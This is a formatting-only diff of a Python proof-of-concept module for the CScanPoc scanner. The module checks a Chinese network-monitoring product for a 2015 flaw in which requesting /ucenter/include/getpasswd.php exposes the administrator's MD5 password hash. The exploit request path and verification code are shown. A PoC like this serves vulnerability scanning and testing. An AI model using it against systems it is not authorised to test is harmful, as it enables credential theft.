@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'seentech_0013' # 平台漏洞编号，留空
+    vuln_id = 'seentech_0013'  # 平台漏洞编号，留空
     name = '中科新业网络哨兵 管理员MD5密码泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-07-02'  # 漏洞公布时间
     desc = '''
         中科新业网络哨兵 直接访问/ucenter/include/getpasswd.php 即可显示敏感信息，管理员MD5密码泄露。
@@ -32,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0123359
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0123359
             payload = "/ucenter/include/getpasswd.php"
             verify_url = self.target + payload
             r = requests.get(verify_url)
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
